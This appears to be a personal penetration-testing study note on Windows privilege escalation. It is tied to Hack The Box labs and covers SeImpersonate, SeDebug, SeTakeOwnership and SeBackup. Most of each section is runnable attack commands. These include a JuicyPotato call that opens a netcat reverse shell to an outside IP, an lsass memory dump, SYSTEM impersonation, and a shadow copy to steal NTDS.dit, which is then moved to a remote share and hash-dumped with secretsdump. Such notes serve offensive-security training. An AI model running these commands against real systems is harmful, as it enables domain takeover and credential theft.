- **tags:** #privesc #windows
- ----------------
# Windows Privileges Overview
[Privileges](https://docs.microsoft.com/en-us/windows/win32/secauthz/privileges) in Windows are rights that an account can be granted to perform a variety of operations on the local system such as managing services, loading drivers, shutting down the system, debugging an application, and more. Privileges are different from access rights, which a system uses to grant or deny access to securable objects. *User and group privileges are stored in a database and granted via an access token* when a user logs on to a system. Each time a user attempts to perform a privileged action, the system reviews the user's access token to see if the account has the required privileges, and if so, checks to see if they are enabled. Be aware that the *UAC (User Account Control)* restricts applications from running with full permissions unless necessary.
# Windows Access Tokens
*A Windows access token is responsible for identifying and describing the security context of a process or thread running on a system*. Simply put, an access token can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resource is accessed. Access token are generated by the `winlogon.exe` process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the `userinit.exe` process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.
## JuicyPotato - SeImpersonate - SeAssignPrimary Token
![[RottenPotato.png]]
*SeImpersonate* privilege can be used to impersonate a privileged account such as `NT AUTHORITY\SYSTEM`. [JuicyPotato](https://github.com/ohpe/juicy-potato) is the *Rotten Potato* attack on steroids and can be used to exploit the `SeImpersonate` or `SeAssignPrimaryToken` privileges via DCOM/NTLM reflection abuse.
- [Potato Attacks Article](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
-  [Youtube Explaination of Rotten Potato Attack](https://www.youtube.com/watch?v=8Wjs__mWOKI)
- Usage:
```shell
# start a listener
nc -lvnp 8443
# execute Juicy Potato
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```
**JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards**. However, [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access.
- On older systems you may want to try with [Churrasco](https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/) if JuicyPotato is giving you any problems.
### Practice Labs:
- *Bounty HTB* Easy Windows Machine
- [HTB Academy Windows Privilege Escalation Juicy Potato Lab](https://academy.hackthebox.com/module/67/section/607)
# SeDebugPrivilege
To run a particular application or service or assist with troubleshooting, a user might be assigned the [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) instead of adding the account into the administrators group. Users with this privilege can attach to or open any process, even a process they do not own. This user right provides access to sensitive and critical operating-system components.
**Dumping LSA Secrets**:
This privilege can be leveraged to create a memory DUMP file of the *lsass.exe* process. There are 2 different ways to accomplish such task
- [[Dumping Credentials#lsass.DMP via Task Manager|With an RDP session using the Task Manager]]
- Using [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite.
```shell
# Memory dump using procdump
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
**Privilege Escalation to SYSTEM Account**:
- [If we land onto an account with SeDebugPrivilege we can escalte to the System Account](https://github.com/decoder-it/psgetsystem)
```powershell
tasklist /svc | findstr lsass # grab a SYSTEM PID
. .\psgetsys.ps1
ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
```
# SeTakeOwnershipPrivilege
[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to *take ownership of any "securable object"*, meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes.
- List ownership of a file:
```shell
dir /q flag.txt
```
- Take Owner-ship of file
```shell
takeown /f flag.txt 
```
- We may still not be able to read the file and need to modify the file ACL using `icacls`
```shell
icacls flag.txt # lists ACE
icacls flag.txt /grant ant:F
```
# SeBackupPrivilege
Any member of the *Backup Operators* group will be granted the *SeBackup* and *SeRestore* privileges. The [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) allows us to traverse any folder and list the folder contents. **This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL).**
## Copying a Protected File
The built-in utility [robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) can be used to copy files in backup mode:
```shell
# make sure you are using the BackUp Switch or it won't work
robocopy /B C:\Users\Administrator\Desktop C:\Windows\Temp\AdminDesktop\
# we can add the /E option to copy all subdirectories recursively
```
## Dumping NTDS.dit or SAM
Any user with the *SeBackupPrivilege* will be able to dump the *SAM* hashes as explained [[Dumping Credentials#Dumping Hashes from SAM|here]]. As the `NTDS.dit` file is locked by default, we can use the Windows [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) utility to create a shadow copy of the `C` drive and expose it as `E` drive. The NTDS.dit in this shadow copy won't be in use by the system and we'll be able to copy and extract its contents.
### Shadow Copy of C drive
```powershell
PS C:\htb> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```
Since the `E:\` drive isn't being used, nor will be the *ntds.dit* file found inside, therefore, we can now use robocopy to copy the file and later extract its hashes with `impacket-secretsdump`:
```powershell
robocopy /R E:\Windows\NTDS C:\Windows\Temp\NTDS\ ntds.dit
net use N: \\10.10.11.12\smbFolder /user:username password
move C:\Windows\Temp\NTDS\ntds.dit N:\ntds.dit
```
```bash
# on our attacker's machine
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
# Appendix
In case we find ourselves with the required privileges but still can't take advantage of them because they are disabled we can run the following to enable them all at once:
- [EnableAllTokenPrivs.ps1](https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1)
